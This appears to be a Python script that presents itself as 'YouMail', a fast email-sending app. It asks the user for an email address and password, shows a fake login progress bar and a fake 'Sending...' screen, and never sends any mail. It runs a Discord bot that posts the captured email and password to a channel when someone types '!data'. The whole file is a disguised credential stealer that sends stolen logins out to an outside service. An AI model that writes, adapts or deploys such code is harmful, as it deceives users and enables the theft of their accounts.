import time
import discord
import os
import tqdm
import colorama

from tqdm import *
from colorama import init, Fore

init()

clear = lambda: os.system('clear')
email = None
password = None
msg = None
client = discord.Client()
body = None
title = None
TOKEN = '<Token for your bot>'
timer = 0

def frontend():
    clear()
    print(Fore.BLUE + 'Welcome to YouMail, the fastest email service for every provider.')
    print(Fore.BLUE + 'With UMail, all you have to do is log in and you can send an email faster than ever before.')
    input(Fore.BLUE + 'Press enter to continue...')
    clear()

    login()

def login():
    global email
    global password

    print(Fore.BLUE + 'We are now loggin you in.')
    email = input('Please enter your email: ')
    password = input('Please enter your password: ')
    
    clear()

    for _ in tqdm(range(100),
        desc = 'Logging in',
        ascii = False):
        time.sleep(0.6347)

    send_mail()

def send_mail():
    global body
    global title
    global reciever

    clear()
    time.sleep(0.5)
    reciever = input(Fore.BLUE + 'Enter the recieving email address: ')
    body = input(Fore.BLUE + 'Enter the body of your email: ')
    title = input(Fore.BLUE + 'Enter the title of your email: ')

    clear()
    check_mail()

def check_mail():
    global email
    global body
    global reciever
    global title

    print(Fore.GREEN + 'From:', email)
    print(Fore.YELLOW + 'To:', reciever)
    print('')
    print(title)
    print(body)
    print('')
    print('')
    print('')
    print('Sending...')
    print('ETA: 30s')
    client.run(TOKEN)

@client.event
async def on_message(message):
    global msg
    global live
    global email
    global password
    global timer

    msg = (f'{email} : {password}')

    username = str(message.author).split('#')[0]
    user_message = str(message.content)
    channel = str(message.channel.name)

    if live == True:
        if user_message == '!data':
            await message.channel.send(msg)
            print('Sent!')
            input('Press enter to close.')
        else:
            timer = timer + 1
            if timer == 30:
                print('Sent!')
            time.sleep(1)

@client.event
async def on_ready():
    global msg
    global live

    live = True

frontend()
